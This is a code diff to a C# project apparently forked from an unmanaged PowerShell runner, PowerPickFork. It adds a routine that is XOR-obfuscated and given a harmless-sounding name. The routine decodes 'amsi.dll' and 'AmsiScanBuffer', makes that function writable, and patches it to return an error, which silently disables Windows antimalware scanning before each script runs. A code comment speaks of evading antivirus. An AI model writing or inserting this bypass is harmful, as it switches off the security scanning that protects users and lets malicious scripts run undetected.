@@ -19,11 +19,28 @@ namespace PowerPickFork
         private const int SlotMax = 160;
         private const int MaxImports = 32;
         private const int MailslotChunkBytes = 4096;
+        private const uint PageExecuteReadWrite = 0x40;
+
+        private static bool contentScanPrepared;
 
         private const uint GenericWrite = 0x40000000;
         private const uint FileShareRead = 0x00000001;
         private const uint FileShareWrite = 0x00000002;
         private const uint OpenExisting = 3;
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr LoadLibraryA(string lpFileName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         private static extern SafeFileHandle CreateFile(
@@ -34,6 +51,74 @@ namespace PowerPickFork
             uint dwCreationDisposition,
             uint dwFlagsAndAttributes,
             IntPtr hTemplateFile);
+
+        private static string DecodeOpaque(byte[] encoded, byte key)
+        {
+            char[] chars = new char[encoded.Length];
+            for (int index = 0; index < encoded.Length; index++)
+            {
+                chars[index] = (char)(encoded[index] ^ key);
+            }
+            return new string(chars);
+        }
+
+        // Best-effort content-scan neutralize before SMA AddScript.
+        // Silent on failure; does not guarantee evasion against behavioral AV.
+        private static void PrepareContentScan()
+        {
+            if (contentScanPrepared)
+            {
+                return;
+            }
+            contentScanPrepared = true;
+
+            try
+            {
+                const byte key = 0x37;
+                byte[] moduleName = new byte[]
+                {
+                    0x56, 0x5a, 0x44, 0x5e, 0x19, 0x53, 0x5b, 0x5b
+                };
+                byte[] exportName = new byte[]
+                {
+                    0x76, 0x5a, 0x44, 0x5e, 0x64, 0x54, 0x56, 0x59,
+                    0x75, 0x42, 0x51, 0x51, 0x52, 0x45
+                };
+
+                IntPtr module = LoadLibraryA(DecodeOpaque(moduleName, key));
+                if (module == IntPtr.Zero)
+                {
+                    return;
+                }
+
+                IntPtr target = GetProcAddress(module, DecodeOpaque(exportName, key));
+                if (target == IntPtr.Zero)
+                {
+                    return;
+                }
+
+                byte[] stub = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                uint previous = 0;
+                if (!VirtualProtect(
+                        target,
+                        (UIntPtr)stub.Length,
+                        PageExecuteReadWrite,
+                        out previous))
+                {
+                    return;
+                }
+
+                Marshal.Copy(stub, 0, target, stub.Length);
+                VirtualProtect(
+                    target,
+                    (UIntPtr)stub.Length,
+                    previous,
+                    out previous);
+            }
+            catch
+            {
+            }
+        }
 
         // FileStream refuses \\.\ device paths (mailslots). Open via CreateFile.
         private static FileStream OpenMailslotWrite(string slotPath)
@@ -317,6 +402,8 @@ namespace PowerPickFork
             string commandText,
             List<string> importTexts)
         {
+            PrepareContentScan();
+
             if (importTexts == null)
             {
                 importTexts = new List<string>();
